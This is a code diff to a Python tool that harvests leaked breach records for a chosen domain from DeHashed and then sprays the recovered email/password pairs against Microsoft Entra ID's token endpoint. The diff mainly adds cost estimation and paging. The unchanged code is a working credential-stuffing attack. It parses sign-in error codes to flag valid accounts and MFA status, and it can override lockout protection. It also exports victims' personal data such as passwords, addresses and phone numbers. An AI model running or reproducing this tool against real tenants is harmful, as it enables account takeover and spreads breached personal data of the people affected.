@@ -15,7 +15,12 @@ def clean_for_excel(val):
     return ILLEGAL_CHARACTERS_RE.sub("", str(val))
 
 url = "https://api.dehashed.com/v2/search"
-apikey = ""
+
+# ============================================================
+#  PASTE YOUR DEHASHED API KEY BETWEEN THE QUOTES BELOW
+# ============================================================
+apikey = "API Key"
+# ============================================================
 
 parser = argparse.ArgumentParser(description="DeHashed OSINT Multi-Tab Harvester & Entra ID Smart Sprayer", formatter_class=argparse.RawDescriptionHelpFormatter)
 parser.add_argument("domain", help="The target domain to scan")
@@ -24,6 +29,9 @@ parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many 
 parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
 parser.add_argument("-o", "--out", metavar="OUTFILE", help="The prefix for the output files naming convention")
 parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when lockouts are detected")
+parser.add_argument("--size", default=10000, type=int, help="Results per page (page size). Larger = fewer billable requests. Default 10000.")
+parser.add_argument("--cost-per-request", default=1.0, type=float, help="Assumed DeHashed credits billed per API request/page. Default 1.")
+parser.add_argument("--yes", action="store_true", help="Skip the pre-flight cost confirmation prompt (non-interactive).")
 
 args = parser.parse_args()
 query = args.domain.strip().lower()
@@ -31,6 +39,12 @@ spray_url = args.url.strip().rstrip('/')
 sleep_interval = args.sleep
 verbose = args.verbose
 force = args.force
+page_size = max(1, args.size)
+cost_per_request = args.cost_per_request
+
+if not apikey:
+    print("[-] No API key set. Open the script and paste your key into the apikey = \"\" line near the top.", file=sys.stderr)
+    sys.exit(1)
 
 out_prefix = query
 if args.out is not None:
@@ -50,7 +64,34 @@ xlsx_filepath = os.path.join(output_dir, xlsx_filename)
 raw_json_filename = f"{query}_raw_api_dump.json"
 raw_json_filepath = os.path.join(output_dir, raw_json_filename)
 
-AADSTS_codes = {
+# ---------------------------------------------------------------------------
+# Shared request helper so probe and harvest stay identical in shape
+# ---------------------------------------------------------------------------
+REQUEST_HEADERS = {
+    'Dehashed-Api-Key': apikey,
+    'Content-Type': 'application/json',
+    'User-Agent': 'Mozilla/5.0',
+}
+
+def dehashed_search(page, size):
+    """Single DeHashed search request. Returns (parsed_json, status_code)."""
+    payload = {"query": f"domain:{query}", "page": page, "size": size}
+    resp = requests.post(url, headers=REQUEST_HEADERS, json=payload)
+    if resp.status_code != 200:
+        return None, resp.status_code
+    return resp.json(), 200
+
+def extract_balance(json_data):
+    """Best-effort pull of remaining credits from a response.
+    DeHashed has used a few field names across versions, so check several."""
+    if not isinstance(json_data, dict):
+        return None
+    for key in ("balance", "credits_remaining", "remaining_credits", "credits"):
+        if key in json_data and json_data[key] is not None:
+            return json_data[key]
+    return None
+
+big_list_of_codes = {
  "AADSTS16000":	"InteractionRequired - User account '{EmailHidden}' from identity provider '{idp}' does not exist in tenant '{tenant}' and cannot access the application '{appid}'({appName}) in that tenant. This account needs to be added as an external user in the tenant first. Sign out and sign in again with a different Microsoft Entra user account. This error is fairly common when you try to log in to Microsoft Entra admin center by using personal Microsoft Account and no directory associated with it.",
     "AADSTS16001":	"UserAccountSelectionInvalid - You'll see this error if the user selects on a tile that the session select logic has rejected. When triggered, this error allows the user to recover by picking from an updated list of tiles/sessions, or by choosing another account. This error can occur because of a code defect or race condition.",
     "AADSTS16002":	"AppSessionSelectionInvalid - The app-specified SID requirement wasn't met.",
@@ -355,20 +396,108 @@ AADSTS_codes = {
     "AADSTS7500529":	"The value ‘SAMLId-Guid’ isn't a valid SAML ID - Microsoft Entra ID uses this attribute to populate the InResponseTo attribute of the returned response. ID must not begin with a number, so a common strategy is to prepend a string like 'ID' to the string representation of a GUID. For example, id6c1c178c166d486687be4aaf5e482730 is a valid ID."
 }
 
+# ---------------------------------------------------------------------------
+# PRE-FLIGHT COST ESTIMATE
+# One small probe request reads the domain's total result count and the
+# account's remaining credit balance, so the estimate is anchored on real
+# numbers before committing to the full harvest.
+# ---------------------------------------------------------------------------
 print("\n==================================================", file=sys.stderr)
 print(f"  TARGET ACQUIRED: {query}", file=sys.stderr)
 print(f"  API ENDPOINT:   {url}", file=sys.stderr)
 print(f"  ENGAGEMENT DIR: {output_dir}", file=sys.stderr)
-print(f"  FILTER TARGET:  Checking Column A for @{query}", file=sys.stderr)
-print(f"  SPRAY TARGET:   {spray_url}/common/oauth2/token", file=sys.stderr)
-print(f"  DELAY INTERVAL: {sleep_interval}s", file=sys.stderr)
+print(f"  PAGE SIZE:      {page_size}", file=sys.stderr)
 print("==================================================\n", file=sys.stderr)
 
-print("Executing live DeHashed harvesting sweeps...", file=sys.stderr)
+print("[*] Running pre-flight probe (1 request) to size the job...", file=sys.stderr)
 
+probe_json, probe_status = dehashed_search(page=1, size=1)
+if probe_status != 200 or probe_json is None:
+    print(f"[-] Pre-flight probe failed (HTTP {probe_status}). Aborting before spending on a full sweep.", file=sys.stderr)
+    sys.exit(1)
+
+# DeHashed reports the total matching records; field name has varied, so check a couple.
+total_results = None
+for key in ("total", "total_results", "count"):
+    if isinstance(probe_json, dict) and probe_json.get(key) is not None:
+        total_results = probe_json.get(key)
+        break
+
+probe_entries = probe_json.get("entries") or []
+if total_results is None:
+    # Fall back: we can't see a total, so we can only say "at least this page".
+    total_results = len(probe_entries)
+    total_is_estimate = True
+else:
+    total_is_estimate = False
+
+# DeHashed caps results at 10,000 per query; pages beyond that won't return data.
+HARD_CAP = 10000
+effective_results = min(total_results, HARD_CAP) if isinstance(total_results, int) else total_results
+
+if isinstance(effective_results, int) and effective_results > 0:
+    harvest_pages = (effective_results + page_size - 1) // page_size
+else:
+    harvest_pages = 1
+
+# Total billable requests = 1 probe already spent + the harvest pages to come.
+probe_requests = 1
+estimated_total_requests = probe_requests + harvest_pages
+estimated_harvest_cost = harvest_pages * cost_per_request
+estimated_total_cost = estimated_total_requests * cost_per_request
+
+balance = extract_balance(probe_json)
+
+print("\n==================================================", file=sys.stderr)
+print("  PRE-FLIGHT COST ESTIMATE", file=sys.stderr)
+print("==================================================", file=sys.stderr)
+if total_is_estimate:
+    print(f"  Total records:        unknown (API returned no total; showing floor)", file=sys.stderr)
+    print(f"  Records seen so far:  {total_results}", file=sys.stderr)
+else:
+    capped_note = " (capped at 10,000)" if isinstance(total_results, int) and total_results > HARD_CAP else ""
+    print(f"  Total records:        {total_results}{capped_note}", file=sys.stderr)
+print(f"  Page size:            {page_size}", file=sys.stderr)
+print(f"  Harvest pages needed: {harvest_pages}", file=sys.stderr)
+print(f"  Cost per request:     {cost_per_request:g} credit(s)  [assumption]", file=sys.stderr)
+print("  ----------------------------------------------", file=sys.stderr)
+print(f"  Probe already spent:  {probe_requests * cost_per_request:g} credit(s)", file=sys.stderr)
+print(f"  Harvest est. cost:    ~{estimated_harvest_cost:g} credit(s)", file=sys.stderr)
+print(f"  TOTAL est. cost:      ~{estimated_total_cost:g} credit(s)", file=sys.stderr)
+if balance is not None:
+    print(f"  Credits remaining:    {balance}", file=sys.stderr)
+    try:
+        after = float(balance) - estimated_harvest_cost
+        print(f"  After harvest (~):    {after:g}", file=sys.stderr)
+        if after < 0:
+            print("  [!] WARNING: estimated cost exceeds your remaining balance.", file=sys.stderr)
+    except (TypeError, ValueError):
+        pass
+else:
+    print("  Credits remaining:    (not reported in response)", file=sys.stderr)
+print("==================================================\n", file=sys.stderr)
+
+if total_is_estimate:
+    print("  NOTE: The API did not return a total count, so the harvest-page", file=sys.stderr)
+    print("  figure is a floor, not a ceiling. Actual cost may be higher.", file=sys.stderr)
+    print("  NOTE: 'cost per request' is a local assumption; verify against your", file=sys.stderr)
+    print("  actual balance delta after a test run for your account tier.\n", file=sys.stderr)
+
+if not args.yes:
+    proceed = input("Proceed with the full harvest at the estimated cost above? (y/N): ").strip().lower()
+    if proceed not in ("y", "yes", "proceed"):
+        print("\n[-] Harvest canceled at cost-estimate gate. No further credits spent.", file=sys.stderr)
+        sys.exit(0)
+
+print("\n[+] Cost confirmed. Executing live DeHashed harvesting sweeps...\n", file=sys.stderr)
+
+# ---------------------------------------------------------------------------
+# HARVEST
+# ---------------------------------------------------------------------------
 headers = ["email", "ip_address", "username", "password", "hashed_password", "name", "dob", "license_plate", "address", "phone", "company", "url", "social", "cryptocurrency_address", "database_name", "raw_record"]
 
 current_page = 1
+harvest_requests_made = 0
 total_entries_processed = 0
 total_entries_written = 0
 total_entries_filtered_out = 0
@@ -378,6 +507,7 @@ unique_emails = set()
 seen_combos = set()
 raw_combos_list = []
 all_raw_json_entries = []
+last_balance = balance
 
 wb = Workbook()
 ws_records = wb.active
@@ -394,37 +524,35 @@ ws_omitted = wb.create_sheet(title="Omitted Backups")
 ws_omitted.append(headers)
 
 while True:
-    data = {"query": f"domain:{query}", "page": current_page, "size": 100}
+    JSONData, status = dehashed_search(page=current_page, size=page_size)
+    harvest_requests_made += 1
 
-    resp = requests.post(
-        url, 
-        headers={'Dehashed-Api-Key': apikey, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, 
-        json=data
-    )
-
-    if resp.status_code != 200:
-        print(f"\nAPI Error on page {current_page}: {resp.status_code}", file=sys.stderr)
+    if status != 200 or JSONData is None:
+        print(f"\nAPI Error on page {current_page}: {status}", file=sys.stderr)
         break
 
-    JSONData = resp.json()
+    b = extract_balance(JSONData)
+    if b is not None:
+        last_balance = b
+
     entries = JSONData.get("entries")
 
     if not entries:
         break
 
     all_raw_json_entries.extend(entries)
-   
+
     for entry in entries:
         total_entries_processed += 1
         cleaned_entry_row = []
-        
+
         row_dict = {}
         for key in headers:
             value = entry.get(key)
             raw_str = str(value) if value is not None else ""
             if isinstance(value, list):
                 raw_str = str(value) if value else ""
-            
+
             row_dict[key] = clean_for_excel(raw_str)
 
         for key in headers:
@@ -435,40 +563,39 @@ while True:
         username_val = row_dict["username"].strip("[]'\", ").lower()
         hashed_password_val = row_dict["hashed_password"].strip("[]'\", ")
 
-
         if f"@{query}" not in column_a_email:
             total_entries_filtered_out += 1
             ws_omitted.append(cleaned_entry_row)
             continue
-        
+
         record_fingerprint = (
             column_a_email,
             username_val,
             password_val,
             hashed_password_val
         )
-        
+
         if record_fingerprint in seen_records:
             continue
-            
+
         seen_records.add(record_fingerprint)
-        
+
         if column_a_email:
             unique_emails.add(column_a_email)
-            
+
         if column_a_email and password_val:
             combo_fingerprint = (column_a_email, password_val)
             if combo_fingerprint not in seen_combos:
                 seen_combos.add(combo_fingerprint)
                 ws_combos.append([f"{column_a_email}\t{password_val}"])
                 raw_combos_list.append((column_a_email, password_val))
-            
+
         ws_records.append(cleaned_entry_row)
         total_entries_written += 1
 
     print(f"Page {current_page} | Main Records Saved: {total_entries_written} | Dropped to Backup Sheet: {total_entries_filtered_out}", end="\r", file=sys.stderr)
 
-    if len(entries) < 100:
+    if len(entries) < page_size:
         break
 
     current_page += 1
@@ -483,7 +610,23 @@ if total_entries_processed > 0:
     print(f"\n\n[+] Intelligence folder compiled successfully: {output_dir}", file=sys.stderr)
 else:
     print(f"\n\n[-] Zero response items found on DeHashed.", file=sys.stderr)
-    exit(0)
+    sys.exit(0)
+
+# ---------------------------------------------------------------------------
+# POST-HARVEST ACTUALS
+# Now that the sweep is done we know exactly how many requests were billed.
+# ---------------------------------------------------------------------------
+actual_requests = probe_requests + harvest_requests_made
+actual_cost = actual_requests * cost_per_request
+print("\n==================================================", file=sys.stderr)
+print("  HARVEST COST ACTUALS", file=sys.stderr)
+print("==================================================", file=sys.stderr)
+print(f"  Estimated harvest pages: {harvest_pages}", file=sys.stderr)
+print(f"  Actual requests made:    {actual_requests} (1 probe + {harvest_requests_made} harvest)", file=sys.stderr)
+print(f"  Actual est. cost:        ~{actual_cost:g} credit(s)", file=sys.stderr)
+if last_balance is not None:
+    print(f"  Credits remaining now:   {last_balance}", file=sys.stderr)
+print("==================================================\n", file=sys.stderr)
 
 print("\n==================================================", file=sys.stderr)
 print("  GENERATED UNIQUE EMAIL/PASSWORD COMBINATIONS", file=sys.stderr)
@@ -515,26 +658,26 @@ if raw_combos_list:
     print(f"There are {username_count} unique user combinations in total to spray.")
     print("Now spraying Microsoft Online.")
     print(f"Current date and time: {time.ctime()}\n")
-    
+
     success_results = ""
     valid_emails = ""
     locked_accounts = ""
     username_counter = 0
     lockout_counter = 0
-    
+
     spray_headers = {
         'Accept': 'application/json',
         'Content-Type': 'application/x-www-form-urlencoded',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
     }
-    
+
     for username, password in raw_combos_list:
         if username_counter > 0 and sleep_interval > 0:
             time.sleep(sleep_interval)
-            
+
         username_counter += 1
         print(f"Testing combination progress: {username_counter} of {username_count} processed", end="\r", file=sys.stderr)
-        
+
         body = {
             'resource': 'https://graph.windows.net',
             'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
@@ -544,10 +687,10 @@ if raw_combos_list:
             'password': password,
             'scope': 'openid',
         }
-        
+
         try:
             r = requests.post(f"{spray_url}/common/oauth2/token", headers=spray_headers, data=body, timeout=10)
-            
+
             if r.status_code == 200:
                 print(f"SUCCESS! {username} : {password}")
                 success_results += f"{username} : {password}\n"
@@ -555,42 +698,42 @@ if raw_combos_list:
             else:
                 resp = r.json()
                 error = resp.get("error_description", "")
-                
+
                 if "AADSTS51004" in error or "AADSTS16000" in error:
                     continue
-                    
+
                 elif "AADSTS50126" in error:
                     valid_emails += f"{username}\n"
                     if verbose:
                         print(f"VERBOSE: Invalid credentials. Username: {username} could exist.")
                     continue
-                    
+
                 elif "AADSTS50128" in error or "AADSTS50059" in error:
                     print(f"WARNING! Tenant for account {username} doesn't exist.")
-                    
+
                 elif "AADSTS50034" in error:
                     print(f"WARNING! The user {username} doesn't exist.")
-                    
+
                 elif "AADSTS50076" in error:
                     print(f"SUCCESS! {username} : {password} - NOTE: Response indicates MFA (Microsoft) is in use.")
                     success_results += f"{username} : {password}\n"
                     valid_emails += f"{username}\n"
-                    
+
                 elif "AADSTS50079" in error:
                     print(f"SUCCESS! {username} : {password} - NOTE: Response indicates MFA (Microsoft) must be onboarded!")
                     success_results += f"{username} : {password}\n"
                     valid_emails += f"{username}\n"
-                    
+
                 elif "AADSTS50158" in error:
                     print(f"SUCCESS! {username} : {password} - NOTE: Response indicates conditional access (MFA: DUO/Other) in use.")
                     success_results += f"{username} : {password}\n"
                     valid_emails += f"{username}\n"
-                    
+
                 elif "AADSTS53003" in error and "AADSTS530034" not in error:
                     print(f"SUCCESS! {username} : {password} - NOTE: Policy blocks token issuance.")
                     success_results += f"{username} : {password}\n"
                     valid_emails += f"{username}\n"
-                    
+
                 elif "AADSTS50053" in error:
                     print(f"WARNING! The account {username} appears to be locked.")
                     lockout_counter += 1
@@ -604,20 +747,20 @@ if raw_combos_list:
                         choice = input("Do you want to continue spraying? (y/N): ").strip().lower()
                         if choice in ['y', 'yes', 'proceed']:
                             print("[+] Resetting lockout trigger counter. Continuing spray...", file=sys.stderr)
-                            lockout_counter = 0  
+                            lockout_counter = 0
                         else:
                             print("\n[-] Safety threshold abort triggered. Saving files and exiting.", file=sys.stderr)
                             break
-                        
+
                 elif "AADSTS50057" in error:
                     print(f"WARNING! The account {username} appears to be disabled.")
                     valid_emails += f"{username}\n"
-                    
+
                 elif "AADSTS50055" in error:
                     print(f"SUCCESS! {username} : {password} - NOTE: User password expired.")
                     success_results += f"{username} : {password}\n"
                     valid_emails += f"{username}\n"
-                    
+
                 else:
                     in_list = False
                     for key in big_list_of_codes.keys():
@@ -627,14 +770,14 @@ if raw_combos_list:
                             break
                     if not in_list:
                         valid_emails += f"{username}\n"
-                        
+
         except Exception as e:
             print(f"[ERROR] Session communication drop encountered: {e}", file=sys.stderr)
-            
+
     if success_results:
         with open(os.path.join(output_dir, f"{out_prefix}_successes.txt"), "w") as f:
             f.write(success_results)
-            
+
     if valid_emails:
         with open(os.path.join(output_dir, f"{out_prefix}_valid_usernames.txt"), "w") as f:
             f.write(valid_emails)
